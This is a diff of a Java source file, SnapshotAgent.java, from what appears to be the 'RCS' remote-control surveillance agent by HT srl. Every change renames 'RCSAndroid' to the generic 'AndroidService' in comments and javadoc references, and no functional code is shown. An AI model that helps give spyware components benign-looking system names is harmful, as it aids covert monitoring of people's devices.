@@ -1,7 +1,7 @@
 /* *******************************************
  * Copyright (c) 2011
  * HT srl,   All rights reserved.
- * Project      : RCS, RCSAndroid
+ * Project      : RCS, AndroidService
  * File         : SnapshotAgent.java
  * Created      : Apr 9, 2011
  * Author		: zeno
@@ -47,7 +47,7 @@ public class AgentSnapshot extends AgentBase {
 	/*
 	 * (non-Javadoc)
 	 * 
-	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#parse(byte[])
+	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
 	 */
 	@Override
 	public boolean parse(AgentConf conf) {
@@ -63,7 +63,7 @@ public class AgentSnapshot extends AgentBase {
 	/*
 	 * (non-Javadoc)
 	 * 
-	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#begin()
+	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#begin()
 	 */
 	@Override
 	public void begin() {
@@ -74,7 +74,7 @@ public class AgentSnapshot extends AgentBase {
 	/*
 	 * (non-Javadoc)
 	 * 
-	 * @see com.ht.RCSAndroidGUI.ThreadBase#go()
+	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
 	 */
 	@Override
 	public void go() {
@@ -101,7 +101,7 @@ public class AgentSnapshot extends AgentBase {
 	/*
 	 * (non-Javadoc)
 	 * 
-	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#end()
+	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#end()
 	 */
 	@Override
 	public void end() {
